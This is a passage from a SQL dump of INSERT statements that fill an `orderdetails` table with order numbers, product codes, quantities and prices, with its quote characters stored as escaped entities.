\u0026#39;S18_2949\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;84.09\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;60.59\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;95.30\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;84.33\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;115.03\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;207.80\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;122.37\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;43.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;107.34\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;82.78\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;90.53\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;62.70\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;100.14\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;166.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;114.95\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;142.45\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;117.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;164.26\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;140.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;50.29\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;31.47\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;111.18\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;44.37\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;110.16\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;84.30\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;135.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;94.79\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;70.22\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;98.31\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;86.74\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;77.15\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;61.52\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;104.18\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;56.82\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;56.00\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;76.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;68.67\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;87.15\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;97.32\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;48.05\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;143.50\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;64.40\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;53.92\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;68.24\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10352\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;75.13\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10352\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;87.75\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10352\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;62.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10352\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;46.18\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;71.81\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;107.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;69.55\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;86.90\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;68.10\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;35.78\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;73.07\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;74.40\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;84.22\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;95.15\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;178.17\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;157.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;141.58\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;98.65\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;76.61\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;100.19\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;76.23\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;49.06\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;69.15\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;96.92\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;62.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;117.59\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;60.30\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;124.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;56.10\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;37.38\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;60.62\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;137.62\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;75.18\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;32.99\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;93.89\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;120.31\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;82.19\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;44.75\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;130.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;106.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;158.63\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;31.86\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;42.11\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;78.11\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;199.30\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;135.92\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;109.34\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;112.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;58.95\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;91.18\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;59.34\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;104.72\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;84.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;105.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;129.93\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;98.36\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;142.45\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;99.41\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;117.77\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;46.29\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;56.07\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;127.79\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;33.59\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;88.62\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;82.83\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;51.71\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;85.98\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;122.40\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;180.79\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;162.64\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;108.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;45.45\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;62.14\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;99.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;47.45\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;126.15\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;68.43\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;71.40\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;122.93\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;94.79\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;101.64\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;76.36\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;106.14\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;100.77\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;55.49\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;70.81\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;78.83\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;64.67\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;86.61\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;70.11\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;83.14\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;92.36\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;54.05\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;92.83\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;26\u0026#39;, 